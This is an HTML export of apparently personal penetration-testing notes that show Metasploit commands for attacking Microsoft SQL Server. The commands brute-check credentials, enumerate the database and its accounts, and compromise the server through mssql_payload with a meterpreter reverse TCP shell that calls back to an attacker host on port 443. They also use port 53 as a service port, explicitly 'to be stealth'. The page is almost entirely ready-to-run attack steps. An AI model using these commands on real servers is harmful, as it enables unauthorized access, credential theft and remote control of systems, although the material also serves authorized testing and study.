<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MSSQL database Metasploit exploits</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>MSSQL database Metasploit exploits</h1><br/><br /><br /><strong><h3>Test credentials SQL server</h3></strong><br />To test if some credentials(usename:password) are valid for login in the SQL server, we can use the Metasploit’s <strong>mssql_login</strong> module from the attacker machine<br /><div class="codebox"><div class="codebox">msfconsole<br />use&nbsp;auxiliary/scanner/mssql/mssql_login<br />set&nbsp;rhosts&nbsp;&lt;ip-address-database&gt;<br />set&nbsp;rport&nbsp;&lt;service-port-running-on-the-remote-machine&gt;<br />set&nbsp;username&nbsp;&lt;username&gt;<br />set&nbsp;password&nbsp;&lt;password&gt;<br />set&nbsp;verbose&nbsp;true<br />run</div></div><br /><br /><strong><h3>Informations about the database</h3></strong><br />through Metasploit’s <strong>mssql_enum</strong> module we can retrieve informations from the databse<br /><div class="codebox"><div class="codebox">use&nbsp;auxiliary/admin/mssql/mssql_enum<br />set&nbsp;rhosts&nbsp;&lt;ip-address-database&gt;<br />set&nbsp;rport&nbsp;&lt;service-port-running-on-the-remote-machine&gt;<br />set&nbsp;username&nbsp;&lt;username&gt;<br />set&nbsp;password&nbsp;&lt;password&gt;<br />run</div></div><br />with this module sometime we can get also the credentials(username and password) of an account<br /><br /><strong><h3>Compromise the SQL Server</h3></strong><br />through Metasploit’s <strong>mssql_payload</strong> module we can fully compromise the SQL Server,<br /><div class="codebox"><div class="codebox">use&nbsp;exploit/windows/mssql/mssql_payload<br />set&nbsp;rhosts&nbsp;&lt;ip-address-database&gt;<br />set&nbsp;username&nbsp;&lt;username&gt;<br />set&nbsp;password&nbsp;&lt;password&gt;<br />set&nbsp;srvport&nbsp;53&nbsp;&nbsp;&nbsp;#dns&nbsp;port&nbsp;to&nbsp;be&nbsp;stealth<br /><br />set&nbsp;payload&nbsp;windows/x64/meterpreter_reverse_tcp<br />set&nbsp;lhost&nbsp;&lt;local-host-of-the-attacker&gt;<br />set&nbsp;lport&nbsp;443<br />run</div></div></div>
</body>
</html>
